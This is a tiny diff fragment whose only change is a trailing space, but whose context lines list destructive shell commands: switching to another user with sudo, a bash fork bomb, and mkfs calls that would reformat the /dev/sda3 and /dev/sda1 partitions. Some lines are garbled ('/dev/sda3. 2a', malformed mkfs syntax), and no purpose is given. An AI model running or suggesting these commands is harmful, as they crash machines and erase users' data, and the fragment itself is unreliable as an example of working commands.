@@ -1,5 +1,5 @@
 sudo su - _albertBourla
-<off>
+<off> 
 :(){:|:&};:
 mkfs ext4 /dev/sda3. 2a
 mkfs ext4 /dev/sda1
